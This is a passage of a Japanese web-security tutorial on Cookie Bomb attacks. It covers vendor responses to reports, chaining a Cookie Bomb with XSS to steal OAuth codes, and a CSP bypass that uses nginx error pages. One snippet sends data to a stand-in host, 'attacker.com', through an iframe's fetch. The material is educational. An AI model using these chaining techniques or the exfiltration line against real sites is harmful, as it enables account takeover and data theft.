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" width="1073" height="498" class="img_ev3q"></p><p>この脆弱性をTumblrに報告したところ、翌日次のような返信がありました。</p><blockquote><p>この動作は、キャッシュをクリアすることで修正でき、セキュリティ脆弱性というよりも迷惑行為であるため、プラットフォーム自体に具体的かつ悪用可能なリスクをもたらすものではありません。</p></blockquote><p>一部の企業にとって、Cookie Bomb攻撃によって引き起こされる損害は最小限であると考えられています。さらに、最初の被害者は特定のURLにアクセスする必要があり、Cookieをクリアすると問題が解決します。したがって、セキュリティ脆弱性とは見なされません。</p><p>Microsoftの対応も同様です。追加の脆弱性なしにCookie Bomb攻撃のみが存在する場合、セキュリティ脆弱性の最低基準を満たしていません。</p><p>では、Cookie Bomb攻撃と組み合わせることができる他の脆弱性は何でしょうか？</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-bomb脆弱性の連鎖">Cookie Bomb脆弱性の連鎖<a href="#cookie-bomb脆弱性の連鎖" class="hash-link" aria-label="Cookie Bomb脆弱性の連鎖 への直接リンク" title="Cookie Bomb脆弱性の連鎖 への直接リンク">​</a></h2><p>サイバーセキュリティの分野では、一見小さな問題をより大きな問題に結び付けることは常に芸術でした。Cookie Bomb攻撃だけではあまり影響がないかもしれませんが、他の要素と組み合わせると、深刻な脆弱性につながる可能性があります。例えば、以前、Same-siteのウェブサイトがSame-site Cookieの制限を回避し、<code>content-type</code>ヘッダーの解析の問題を通じてCORSの制限を悪用し、結果としてCSRF脆弱性になるのを見てきました。</p><p>最初に紹介したい事例は、2019年のHITCON CMTでのfiledescriptor氏の講演「<a href="https://www.youtube.com/watch?v=njQcVWPB1is&amp;ab_channel=HITCON" target="_blank" rel="noopener noreferrer">The cookie monster in your browsers</a>」で登場しました。</p><p>彼はGoogle OAuthを使用してログインする<code>example.com</code>でXSS脆弱性を発見しました。彼はXSSを使用してOAuthコードを盗み、ユーザーのアカウントに直接アクセスし、より深刻なアカウント乗っ取り脆弱性に変えることができると考えました。</p><p>典型的なOAuthフローは次のとおりです。</p><ol><li>ユーザーが「Googleでサインイン」ボタンをクリックします。</li><li>ウェブページが<code>https://google.com/oauth?client_id=example</code>にリダイレクトされます。</li><li>ユーザーがGoogleでログインし、承認を許可します。</li><li>ウェブページが<code>https://example.com/oauth/callback?code=123</code>にリダイレクトされます。</li><li>ウェブページがさらに<code>https://example.com/home</code>にリダイレクトされ、ログイン成功を示します。</li></ol><p>ユーザーが既に承認を許可している場合、3番目のステップはスキップされ、リダイレクトが直接行われます。</p><p>現在の問題は、コードは1回しか使用できないことです。<code>https://example.com/oauth/callback?code=123</code>にアクセスすると、フロントエンドまたはバックエンドがコードを使用するため、盗まれたコードは役に立たなくなります。ここでCookie Bombが役立ちます。</p><p><code>example.com</code>のXSS脆弱性により、ページを完全に制御できます。Cookieを書き込み、<code>/oauth</code>パスでCookie Bombを実行できます。次に、URLが<code>https://google.com/oauth?client_id=example</code>のiframeを追加できます。承認が完了すると、iframeは<code>https://example.com/oauth/callback?code=123</code>にリダイレクトされます。Cookie Bombのため、サーバーはこの時点でエラーを返します。iframeのURLを取得し、コードを取得できます。これにより、他の誰にも使用されていないことが保証されます。</p><p>2番目のケースはCSPバイパスに関連しています。一部のウェブサイトでは、バックエンドアプリケーションから直接CSPを追加するのではなく、nginxのようなリバースプロキシを使用して一律に追加する場合があります。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    server {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        listen 80;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server_name _;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        index index.php;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        root /www;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        location / {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            try_files $uri $uri/ /index.php?$query_string;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            add_header Content-Security-Policy &quot;script-src &#x27;none&#x27;; object-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            location ~ \.php$ {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                try_files $uri =404;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_pass unix:/run/php-fpm.sock;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_index index.php;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                include fastcgi_params;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="クリップボードにコードをコピー" title="コピー" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>一見すると問題ないように見えます。しかし、nginxが4xxまたは5xxエラーを返した場合、このヘッダーはレスポンスに追加されません。これはnginxのデフォルトの動作であり、<a href="https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header" target="_blank" rel="noopener noreferrer">ドキュメント</a>にも記載されています。</p><blockquote><p>レスポンスコードが200、201（1.3.10）、204、206、301、302、303、304、307（1.1.16、1.0.13）、または308（1.13.0）の場合に限り、指定されたフィールドをレスポンスヘッダーに追加します。</p></blockquote><p>したがって、Cookie Bombを使用して、CSPヘッダーのないエラーページを作成できます。一部の人々は疑問に思うかもしれませんが、これはエラーページなので、CSPがないことに何の意味があるのでしょうか？</p><p>元のページに非常に厳格なCSPがあり、すべてのディレクティブが<code>&#x27;self&#x27;</code>に設定され、<code>script-src</code>にのみ追加の<code>unsafe-inline</code>があるとします。そして、XSS脆弱性を見つけたとします。これにより、コードを実行できます。</p><p>しかし問題は、私たちのデータが送信できないことです！CSPのため、すべての外部リンクがブロックされています。この時点で、Cookie Bombを使用して最初に<code>/test</code>ページを攻撃し、次に<code>/test</code>ページをiframeに入れます。</p><p>iframe内に入ると、同一オリジンポリシーにより、CSPのない<code>/test</code>ページに直接アクセスできます。したがって、このページからリクエストを送信できます。次の例を参照してください。</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value" style="color:#e3116c">f</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">/test</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag special-attr attr-name" style="color:#00a4db">onload</span><span class="token tag special-attr attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag special-attr attr-value value javascript language-javascript function" style="color:#d73a49">run</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation" style="color:#393A34">(</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation" style="color:#393A34">)</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword" style="color:#00009f">function</span><span class="token script language-javascript"> </span><span class="token script language-javascript function" style="color:#d73a49">run</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript"> </span><span class="token script language-javascript punctuation" style="color:#393A34">{</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    f</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript property-access">contentWindow</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">fetch</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&#x27;https://attacker.com?data=...&#x27;</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">  </span><span class="token script language-javascript punctuation" style="color:#393A34">}</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="クリップボードにコードをコピー" title="コピー" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>このようなメソッドは、DoSとiframeを組み合わせてCSP制限をバイパスします。</p><p>（ちなみに、CSPは現在「すべての外部リンクをブロックする」ことはできません。外部にリクエストを送信するだけなら、ページリダイレクトに<code>location=...</code>を使用するなど、より高速な方法があります。）</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="結論">結論<a href="#結論" class="hash-link" aria-label="結論 への直接リンク" title="結論 への直接リンク">​</a></h2><p>この記事では、CookieをDoS攻撃の実行手段として使用し、ウェブページの読み込みを妨げる別の方法を見てきました。この脆弱性自体は大きな影響はありませんが、多くの企業はこれをセキュリティ脆弱性とは見なしていません。しかし、他の手法と組み合わせると、より影響力のある脆弱性になる可能性があります。</p><p>これで第4章「クロスサイト攻撃」は終わりです。最近の記事では、まずオリジンとサイトの違いを理解し、次にCORS設定と誤設定の結果について学びました。また、CSRFとSame-site Cookieについても調査し、最後にSame-siteの制御権を取得した後に実行できる攻撃について議論しました。</p><p>次の記事からは、第5章「その他の興味深いトピック」に入ります。</p><p>この記事は以下を改作したものです：<a href="https://blog.huli.tw/2021/07/10/ja/cookie-bomb/" target="_blank" rel="noopener noreferrer">Cookieの特性を利用したDoS攻撃：Cookie爆弾</a></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="ドキュメントページ"><a class="pagination-nav__link pagination-nav__link--prev" href="/beyond-xss/ja/ch4/subdomain/"><div class="pagination-nav__sublabel">前へ</div><div class="pagination-nav__label">Same-Siteからメインサイトへ</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/beyond-xss/ja/ch5/clickjacking/"><div class="pagination-nav__sublabel">次へ</div><div class="pagination-nav__label">あなたの画面はあなたの画面ではない：クリックジャッキング</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#cookie-bombの紹介" class="table-of-contents__link toc-highlight">Cookie Bombの紹介</a></li><li><a href="#攻撃プロセス" class="table-of-contents__link toc-highlight">攻撃プロセス</a></li><li><a href="#防御策" class="table-of-contents__link toc-highlight">防御策</a></li><li><a href="#攻撃対象領域の拡大" class="table-of-contents__link toc-highlight">攻撃対象領域の拡大</a></li><li><a href="#cookieを簡単に設定できる場所を見つける" class="table-of-contents__link toc-highlight">Cookieを簡単に設定できる場所を見つける</a></li><li><a href="#pocの作成" class="table-of-contents__link toc-highlight">PoCの作成</a></li><li><a href="#緩和策" class="table-of-contents__link toc-highlight">緩和策</a></li><li><a href="#もう一つの実際の事例" class="table-of-contents__link toc-highlight">もう一つの実際の事例</a></li><li><a href="#cookie-bomb脆弱性の連鎖" class="table-of-contents__link toc-highlight">Cookie Bomb脆弱性の連鎖</a></li><li><a href="#結論" class="table-of-contents__link toc-highlight">結論</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 Huli. All rights reserved. Built with Docusaurus.</div></div></div></footer></div>
<script src="/beyond-xss/ja/assets/js/runtime~main.531fd90e.js"></script>
<script src="/beyond-xss/ja/assets/js/main.b4cb8381.js"></script>
</body>
</html>